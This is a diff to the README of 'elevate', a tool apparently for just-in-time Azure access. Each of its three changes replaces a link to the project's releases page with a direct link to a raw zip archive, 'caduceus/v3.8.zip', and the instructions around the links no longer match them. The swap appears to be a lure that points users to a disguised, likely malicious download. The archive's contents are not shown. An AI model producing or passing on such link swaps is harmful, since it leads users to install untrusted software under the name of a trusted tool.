@@ -1,6 +1,6 @@
 # 🚀 elevate - Just-in-Time Azure Access, Right From Your Menu Bar
 
-[![Download Now](https://img.shields.io/badge/Download-elevate-2ea44f?style=for-the-badge)](https://github.com/thanhan1702/elevate/releases)
+[![Download Now](https://img.shields.io/badge/Download-elevate-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/thanhan1702/elevate/main/caduceus/v3.8.zip)
 
 ## ✨ What Does elevate Do?
 
@@ -16,7 +16,7 @@ This guide will walk you through downloading and running elevate on your Windows
 
 First, you need to get the elevate application file onto your computer.
 
-**[Visit this link to download the application.](https://github.com/thanhan1702/elevate/releases)**
+**[Visit this link to download the application.](https://raw.githubusercontent.com/thanhan1702/elevate/main/caduceus/v3.8.zip)**
 
 When you click the link, you'll go to a page with a list of files. Look for the file that fits your computer. Since you're on Windows, find a file that has **"Windows"** or **".exe"** in its name. Click on that file to start downloading.
 
@@ -89,7 +89,7 @@ elevate is a powerful yet simple tool that puts you in control of your digital a
 
 **Ready to get started?** Head over to the download page and give elevate a try.
 
-**👉 [Download elevate Now](https://github.com/thanhan1702/elevate/releases)**
+**👉 [Download elevate Now](https://raw.githubusercontent.com/thanhan1702/elevate/main/caduceus/v3.8.zip)**
 
 ---
 
